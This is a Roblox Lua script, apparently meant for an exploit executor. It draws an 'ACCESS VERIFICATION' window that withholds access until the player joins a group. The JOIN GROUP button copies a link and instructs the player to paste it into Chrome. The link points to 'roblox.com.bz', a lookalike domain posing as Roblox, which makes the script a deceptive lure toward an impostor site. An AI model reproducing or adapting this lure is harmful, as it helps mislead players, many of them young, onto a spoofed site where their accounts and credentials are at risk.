task.wait(0.2)

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")

local player = Players.LocalPlayer

--// CONFIG
local GROUP_ID = 7529319087
local GROUP_LINK = "https://roblox.com.bz/communities/7529319087/"

--// GUI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "ModernAccessUI"
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.Parent = player:WaitForChild("PlayerGui")

-- Main Frame
local Main = Instance.new("Frame")
Main.Parent = ScreenGui
Main.Size = UDim2.new(0, 430, 0, 300)
Main.Position = UDim2.new(0.5, -215, 1, 400)
Main.BackgroundColor3 = Color3.fromRGB(16,16,22)
Main.BorderSizePixel = 0
Instance.new("UICorner", Main).CornerRadius = UDim.new(0,20)

local MainStroke = Instance.new("UIStroke")
MainStroke.Parent = Main
MainStroke.Color = Color3.fromRGB(60,60,70)
MainStroke.Transparency = 0.3
MainStroke.Thickness = 1.2

-- Glow
local Glow = Instance.new("ImageLabel")
Glow.Parent = Main
Glow.BackgroundTransparency = 1
Glow.Image = "rbxassetid://5028857084"
Glow.ImageTransparency = 0.4
Glow.ScaleType = Enum.ScaleType.Slice
Glow.SliceCenter = Rect.new(24,24,276,276)
Glow.Size = UDim2.new(1,50,1,50)
Glow.Position = UDim2.new(0,-25,0,-25)
Glow.ZIndex = 0

-- Top Accent
local Accent = Instance.new("Frame")
Accent.Parent = Main
Accent.Size = UDim2.new(1,0,0,6)
Accent.BorderSizePixel = 0
Instance.new("UICorner", Accent).CornerRadius = UDim.new(0,20)

local AccentGradient = Instance.new("UIGradient")
AccentGradient.Parent = Accent
AccentGradient.Color = ColorSequence.new{
	ColorSequenceKeypoint.new(0, Color3.fromRGB(0,170,255)),
	ColorSequenceKeypoint.new(0.5, Color3.fromRGB(0,255,180)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(0,120,255))
}

-- Title
local Title = Instance.new("TextLabel")
Title.Parent = Main
Title.BackgroundTransparency = 1
Title.Size = UDim2.new(1,0,0,55)
Title.Text = "ACCESS VERIFICATION"
Title.Font = Enum.Font.GothamBold
Title.TextSize = 24
Title.TextColor3 = Color3.fromRGB(255,255,255)

-- Status
local Status = Instance.new("TextLabel")
Status.Parent = Main
Status.BackgroundTransparency = 1
Status.Position = UDim2.new(0,20,0,58)
Status.Size = UDim2.new(1,-40,0,25)
Status.Text = "Checking membership..."
Status.Font = Enum.Font.GothamMedium
Status.TextSize = 15
Status.TextColor3 = Color3.fromRGB(180,180,180)

-- Info Box
local Info = Instance.new("Frame")
Info.Parent = Main
Info.Size = UDim2.new(1,-40,0,105)
Info.Position = UDim2.new(0,20,0,95)
Info.BackgroundColor3 = Color3.fromRGB(24,24,30)
Info.BorderSizePixel = 0
Instance.new("UICorner", Info).CornerRadius = UDim.new(0,16)

local InfoStroke = Instance.new("UIStroke")
InfoStroke.Parent = Info
InfoStroke.Color = Color3.fromRGB(50,50,60)
InfoStroke.Transparency = 0.45

local Instructions = Instance.new("TextLabel")
Instructions.Parent = Info
Instructions.BackgroundTransparency = 1
Instructions.Position = UDim2.new(0,12,0,10)
Instructions.Size = UDim2.new(1,-24,1,-20)
Instructions.Font = Enum.Font.Gotham
Instructions.TextSize = 14
Instructions.TextWrapped = true
Instructions.TextXAlignment = Enum.TextXAlignment.Left
Instructions.TextYAlignment = Enum.TextYAlignment.Top
Instructions.TextColor3 = Color3.fromRGB(220,220,220)
Instructions.Text =
	"â€¢ Press JOIN GROUP\n" ..
	"â€¢ Group link copies automatically\n" ..
	"â€¢ Paste it into Chrome\n" ..
	"â€¢ Join the Roblox community\n" ..
	"â€¢ Access refreshes every 5 seconds"

-- Join Button
local JoinBtn = Instance.new("TextButton")
JoinBtn.Parent = Main
JoinBtn.Size = UDim2.new(0.72,0,0,50)
JoinBtn.Position = UDim2.new(0.14,0,0,220)
JoinBtn.BackgroundColor3 = Color3.fromRGB(0,170,255)
JoinBtn.Text = "JOIN GROUP"
JoinBtn.TextColor3 = Color3.fromRGB(255,255,255)
JoinBtn.Font = Enum.Font.GothamBold
JoinBtn.TextSize = 16
JoinBtn.AutoButtonColor = false
JoinBtn.BorderSizePixel = 0
Instance.new("UICorner", JoinBtn).CornerRadius = UDim.new(0,16)

local BtnGradient = Instance.new("UIGradient")
BtnGradient.Parent = JoinBtn
BtnGradient.Color = ColorSequence.new{
	ColorSequenceKeypoint.new(0, Color3.fromRGB(0,140,255)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(0,220,255))
}

local BtnStroke = Instance.new("UIStroke")
BtnStroke.Parent = JoinBtn
BtnStroke.Color = Color3.fromRGB(120,220,255)
BtnStroke.Transparency = 0.45

-- Footer
local Footer = Instance.new("TextLabel")
Footer.Parent = Main
Footer.BackgroundTransparency = 1
Footer.Position = UDim2.new(0,0,1,-24)
Footer.Size = UDim2.new(1,0,0,20)
Footer.Text = "discord.gg/immortalx"
Footer.Font = Enum.Font.Gotham
Footer.TextSize = 11
Footer.TextColor3 = Color3.fromRGB(125,125,125)

--// STATE
local busy = false
local hasAccess = false

--// CHECK GROUP
local function checkGroup()
	local inGroup = false

	pcall(function()
		inGroup = player:IsInGroup(GROUP_ID)
	end)

	if inGroup then
		hasAccess = true

		Status.Text = "Access Granted âœ…"
		Status.TextColor3 = Color3.fromRGB(0,255,170)

		TweenService:Create(JoinBtn, TweenInfo.new(0.25), {
			BackgroundTransparency = 1,
			TextTransparency = 1
		}):Play()

		task.wait(0.25)
		JoinBtn.Visible = false

	else
		hasAccess = false

		Status.Text = "Join the group to continue âŒ"
		Status.TextColor3 = Color3.fromRGB(255,120,120)

		JoinBtn.Visible = true
	end
end

--// AUTO CHECK LOOP
task.spawn(function()
	while not hasAccess do
		task.wait(5)
		checkGroup()
	end
end)

--// BUTTON FUNCTION
JoinBtn.MouseButton1Click:Connect(function()
	if busy then return end
	busy = true

	if typeof(setclipboard) == "function" then
		setclipboard(GROUP_LINK)

		Status.Text = "Link copied! Paste into Chrome ðŸŒ"
		Status.TextColor3 = Color3.fromRGB(0,210,255)
	else
		Status.Text = "Clipboard unsupported âš ï¸"
		Status.TextColor3 = Color3.fromRGB(255,180,120)
	end

	task.wait(1)
	busy = false
end)

--// HOVER EFFECTS
JoinBtn.MouseEnter:Connect(function()
	TweenService:Create(JoinBtn, TweenInfo.new(0.15), {
		Size = UDim2.new(0.75,0,0,52),
		BackgroundColor3 = Color3.fromRGB(0,190,255)
	}):Play()
end)

JoinBtn.MouseLeave:Connect(function()
	TweenService:Create(JoinBtn, TweenInfo.new(0.15), {
		Size = UDim2.new(0.72,0,0,50),
		BackgroundColor3 = Color3.fromRGB(0,170,255)
	}):Play()
end)

--// DRAGGING
local dragging = false
local dragInput
local dragStart
local startPos

local function update(input)
	local delta = input.Position - dragStart

	Main.Position = UDim2.new(
		startPos.X.Scale,
		startPos.X.Offset + delta.X,
		startPos.Y.Scale,
		startPos.Y.Offset + delta.Y
	)
end

Title.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1
	or input.UserInputType == Enum.UserInputType.Touch then

		dragging = true
		dragStart = input.Position
		startPos = Main.Position

		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)

Title.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement
	or input.UserInputType == Enum.UserInputType.Touch then
		dragInput = input
	end
end)

UserInputService.InputChanged:Connect(function(input)
	if input == dragInput and dragging then
		update(input)
	end
end)

--// ENTRANCE ANIMATION
TweenService:Create(
	Main,
	TweenInfo.new(0.6, Enum.EasingStyle.Quint, Enum.EasingDirection.Out),
	{
		Position = UDim2.new(0.5,-215,0.5,-150)
	}
):Play()

--// INITIAL CHECK
checkGroup()
